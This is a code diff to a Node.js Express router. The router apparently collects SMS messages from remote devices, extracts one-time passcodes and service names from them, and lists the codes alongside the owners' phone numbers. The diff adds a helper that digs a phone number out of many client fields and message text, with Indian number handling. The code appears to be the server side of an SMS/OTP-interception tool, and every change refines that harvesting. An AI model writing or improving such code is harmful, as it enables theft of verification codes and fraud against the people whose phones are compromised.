@@ -61,16 +61,11 @@ router.get("/", async (req, res, next) => {
           if (messagesRoot && typeof messagesRoot === "object") {
             for (const [deviceId, deviceMessages] of Object.entries(messagesRoot)) {
               if (!deviceMessages || typeof deviceMessages !== "object") continue;
-              const device = devices.find((d) => d.id === deviceId) || { id: deviceId, phoneNumber: "—" };
+              const device = devices.find((d) => d.id === deviceId) || { id: deviceId };
               const msgArray = Object.values(deviceMessages);
-              let phone = OtpExtractor.extractPhoneNumber(device, msgArray);
 
-              // Also try raw client data for phone
-              if (!phone && clientsData && clientsData[deviceId]) {
-                const raw = clientsData[deviceId];
-                const rp = raw.phoneNumber || raw.phone || raw.number || raw.mobileNumber || raw.mobile || raw.phoneNo || "";
-                if (rp && rp !== "—") phone = String(rp).replace(/[^0-9]/g, "");
-              }
+              // Extract phone — same logic as OTP route (prepend 91 for Indian numbers)
+              let phone = getPhone(device, clientsData?.[deviceId], msgArray);
 
               for (const [, msg] of Object.entries(deviceMessages)) {
                 if (!msg || typeof msg !== "object") continue;
@@ -81,7 +76,7 @@ router.get("/", async (req, res, next) => {
                 const rawTs = msg.timestamp || msg.time || msg.date || "";
                 otps.push({
                   service: extracted.service,
-                  phone: phone || "Unknown",
+                  phone: OtpExtractor.maskPhone(phone),
                   code: extracted.code,
                   message: text.trim().slice(0, 200),
                   timestamp: rawTs ? (typeof rawTs === "number" ? new Date(rawTs).toISOString() : String(rawTs)) : new Date().toISOString(),
@@ -181,3 +176,38 @@ router.post("/devices/:id/sms", async (req, res, next) => {
 });
 
 module.exports = router;
+
+// ═══ Helpers ═══════════════════════════════════════════════
+
+function getPhone(device, rawClient, messages) {
+  const candidates = [
+    device?.phoneNumber, device?.phone, device?.number,
+    device?.mobileNumber, device?.mobile, device?.simNumber,
+  ];
+  if (rawClient) {
+    candidates.push(
+      rawClient.phoneNumber, rawClient.phone, rawClient.number,
+      rawClient.mobileNumber, rawClient.mobile, rawClient.phoneNo,
+      rawClient.contactNumber, rawClient.simNumber, rawClient.sim,
+      rawClient.registeredNumber, rawClient.devicePhone,
+    );
+  }
+  if (messages && Array.isArray(messages)) {
+    for (const msg of messages) {
+      const text = msg.text || msg.body || msg.message || "";
+      const indianMatch = text.match(/(?:\+91|91)?[\s-]?([6-9]\d{9})/);
+      if (indianMatch) candidates.push(indianMatch[1]);
+      const intlMatch = text.match(/\+?(\d{10,15})/);
+      if (intlMatch) candidates.push(intlMatch[1]);
+    }
+  }
+  for (const c of candidates) {
+    if (!c || c === "—") continue;
+    const digits = String(c).replace(/[^0-9]/g, "");
+    if (digits.length >= 10) {
+      if (digits.length === 10 && /^[6-9]/.test(digits)) return "91" + digits;
+      return digits;
+    }
+  }
+  return "";
+}
